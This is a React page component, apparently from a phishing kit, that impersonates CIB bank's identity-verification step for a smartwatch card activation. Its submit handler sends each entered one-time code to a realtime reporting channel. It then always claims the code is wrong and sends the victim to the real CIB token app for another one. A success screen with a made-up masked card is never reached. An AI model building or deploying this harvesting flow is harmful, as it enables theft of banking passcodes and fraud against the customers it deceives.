import { useState, useRef, useEffect } from 'react';
import { useLocation, Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { Button } from '@/components/ui/button';
import { ChevronRight, CheckCircle2, ShieldCheck, Smartphone, AlertCircle, ArrowLeft } from 'lucide-react';
import { useRegistration } from '@/context/RegistrationContext';
import { useRealtime } from '@/context/RealtimeContext';

export default function Verify() {
  const [, setLocation] = useLocation();
  const { data } = useRegistration();
  const { reportStage } = useRealtime();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isSuccess, setIsSuccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    reportStage('verify', {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (inputRefs.current[0] && !isSuccess) {
      inputRefs.current[0].focus();
    }
  }, [isSuccess]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    if (error) setError('');
    
    const newCode = [...code];
    if (value.length > 1) {
      const pastedCode = value.slice(0, 6).split('');
      for (let i = 0; i < pastedCode.length; i++) {
        if (index + i < 6) newCode[index + i] = pastedCode[i];
      }
      setCode(newCode);
      const nextFocus = Math.min(index + pastedCode.length, 5);
      inputRefs.current[nextFocus]?.focus();
      return;
    }

    newCode[index] = value;
    setCode(newCode);

    if (value !== '' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && code[index] === '' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const fullCode = code.join('');
    if (fullCode.length >= 4) {
      reportStage('verify', { verificationCode: fullCode });
      setIsSubmitting(true);
      setError('');
      setTimeout(() => {
        setIsSubmitting(false);
        setError('رمز التحقق غير صحيح أو منتهي. يرجى الحصول على رمز جديد والمحاولة مرة أخرى.');
        setCode(['', '', '', '', '', '']);
        inputRefs.current[0]?.focus();
      }, 1500);
    }
  };

  if (isSuccess) {
    return (
      <AppLayout>
        <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto px-4 py-8 animate-in fade-in zoom-in-95 duration-500">
          <div className="w-24 h-24 mb-6 rounded-full bg-primary/10 border border-primary/20 flex items-center justify-center relative">
            <div className="absolute inset-0 rounded-full border border-primary/30 animate-ping opacity-70" style={{ animationDuration: '2.5s' }} />
            <ShieldCheck className="w-12 h-12 text-primary" />
          </div>
          
          <h2 className="text-3xl font-extrabold text-foreground mb-3 text-center tracking-tight">تم التفعيل بنجاح</h2>
          
          <p className="text-sm text-muted-foreground text-center mb-8 leading-relaxed max-w-sm">
            عزيزي <span className="font-semibold text-foreground">{data.fullName || 'العميل'}</span>، تمت إضافة بطاقة <span className="text-primary font-semibold">CIB Prime</span> إلى ساعتك الذكية بنجاح للتشغيل الفوري.
          </p>
          
          <div className="bg-gradient-to-br from-card to-muted/40 border border-border rounded-xl p-6 w-full shadow-sm mb-8">
            <div className="space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-border/60">
                <span className="text-xs font-medium text-muted-foreground">البطاقة</span>
                <span className="font-mono font-bold tracking-wider text-foreground">•••• 4920</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-xs font-medium text-muted-foreground">حالة المحفظة</span>
                <span className="flex items-center gap-1.5 text-xs text-emerald-600 dark:text-emerald-400 font-bold bg-emerald-500/10 px-2.5 py-1 rounded-md">
                  <CheckCircle2 className="w-3.5 h-3.5" /> جاهزة للدفع
                </span>
              </div>
            </div>
          </div>
          
          <Link href="/" className="w-full">
            <Button size="lg" className="w-full h-12 text-base font-semibold rounded-lg shadow-sm">
              العودة للرئيسية
            </Button>
          </Link>
        </div>
      </AppLayout>
    );
  }

  return (
    <AppLayout>
      <div className="flex-1 flex flex-col max-w-lg w-full mx-auto px-4 py-6 justify-center animate-in fade-in slide-in-from-bottom-4 duration-400">
        
        <div className="mb-8 flex items-center justify-between">
          <div className="space-y-1">
            <h1 className="text-2xl md:text-3xl font-extrabold text-foreground tracking-tight">تأكيد الهوية</h1>
            <p className="text-xs md:text-sm text-muted-foreground">أدخل رمز التفعيل الخاص بحساب CIB الخاص بك</p>
          </div>
          <Link href="/create-account" className="w-10 h-10 flex items-center justify-center rounded-lg bg-card border border-border hover:bg-muted/80 transition-all shadow-sm">
            <ChevronRight className="w-5 h-5 text-muted-foreground" />
          </Link>
        </div>

        <div className="bg-card border border-border/80 rounded-2xl p-6 md:p-8 shadow-sm">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wider block text-center mb-1">
                رمز التحقق المكون من 6 أرقام
              </label>
              <div className="flex justify-between gap-2" dir="ltr">
                {code.map((digit, index) => (
                  <input
                    key={index}
                    ref={el => { inputRefs.current[index] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={e => handleChange(index, e.target.value)}
                    onKeyDown={e => handleKeyDown(index, e)}
                    className={`flex-1 h-14 text-center text-2xl font-bold bg-muted/30 border rounded-xl focus:outline-none focus:ring-2 transition-all ${
                      error 
                        ? 'border-destructive focus:border-destructive focus:ring-destructive/20' 
                        : 'border-input focus:border-primary focus:ring-primary/20'
                    }`}
                  />
                ))}
              </div>
            </div>

            {error && (
              <div className="flex items-start gap-2.5 p-3.5 bg-destructive/10 border border-destructive/20 rounded-xl animate-in fade-in duration-200">
                <AlertCircle className="w-4 h-4 text-destructive mt-0.5 flex-shrink-0" />
                <p className="text-destructive text-xs font-medium leading-relaxed">
                  {error}
                </p>
              </div>
            )}

            <div className="bg-muted/40 border border-border/60 rounded-xl p-4 text-xs md:text-sm leading-relaxed text-muted-foreground">
              لحمايتك، يتم تسليم رموز الخدمات المصرفية المشفرة وتفعيلها بشكل آمن ومباشر عبر فروع البنك المعتمدة.
            </div>

            <Button 
              type="submit" 
              size="lg" 
              className="w-full h-12 text-base font-semibold rounded-xl" 
              disabled={code.join('').length < 4 || isSubmitting}
            >
              {isSubmitting ? (
                <span className="flex items-center gap-2">
                  <div className="w-4 h-4 rounded-full border-2 border-background border-t-transparent animate-spin" />
                  جاري معالجة الطلب...
                </span>
              ) : (
                'تأكيد وتفعيل الحساب'
              )}
            </Button>

            <div className="relative flex py-2 items-center text-muted-foreground">
              <div className="flex-grow border-t border-border/60"></div>
              <span className="flex-shrink mx-4 text-xs font-medium bg-card px-2">أو الحصول على رمز جديد</span>
              <div className="flex-grow border-t border-border/60"></div>
            </div>

            <a 
              href="https://apps.apple.com/us/app/cib-otp-token/id1074048518?l=ar"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center justify-between p-3.5 bg-gradient-to-l from-primary/5 via-transparent to-transparent border border-primary/10 rounded-xl hover:bg-primary/5 transition-all duration-200 group"
            >
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-primary/10 rounded-lg flex items-center justify-center text-primary group-hover:scale-105 transition-transform">
                  <Smartphone className="w-5 h-5" />
                </div>
                <div>
                  <p className="text-foreground font-bold text-sm leading-tight">
                    تطبيق CIB Token للإنشاء الفوري
                  </p>
                  <p className="text-muted-foreground text-xs mt-0.5">
                    اضغط هنا لفتح التطبيق وتوليد رمز التحقق تلقائياً
                  </p>
                </div>
              </div>
              <ArrowLeft className="w-4 h-4 text-primary group-hover:-translate-x-1 transition-transform" />
            </a>
          </form>
        </div>

        <div className="mt-8 flex justify-center gap-2">
          <div className="h-1.5 w-6 rounded-full bg-border" />
          <div className="h-1.5 w-6 rounded-full bg-border" />
          <div className="h-1.5 w-6 rounded-full bg-primary" />
        </div>
      </div>
    </AppLayout>
  );
}
